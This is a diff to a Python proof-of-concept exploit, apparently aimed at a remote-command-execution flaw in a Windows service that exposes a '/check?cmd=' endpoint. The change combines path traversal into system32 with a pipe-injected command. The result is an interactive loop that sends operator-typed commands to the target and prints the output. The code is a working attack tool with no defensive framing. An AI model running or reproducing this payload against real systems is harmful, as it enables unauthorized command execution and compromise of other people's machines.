@@ -36,11 +36,11 @@ def exp_poc(ip, port):
 	req = requests.get(url, headers=headers,timeout=30)
 	if req.text.find("error")>-1:
 		print("WindowsPowerShell不可用，尝试使用windows/system32/.....")
-		url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../../windows/system32/"
+		url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../../windows/system32/cmd"
 		req = requests.get(url, headers=headers,timeout=30)
 		while 1:
 			cmd=input("输入命令：")
-			url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../../windows/system32/" + cmd
+			url = "http://"+str(ip) + ":"+str(port) +"/check?cmd=ping../../../../../../../../../../windows/system32/cmd |" + cmd
 			req = requests.get(url, headers=headers,timeout=30)
 			print(str(req.content.decode('gbk')))
 	while 1:
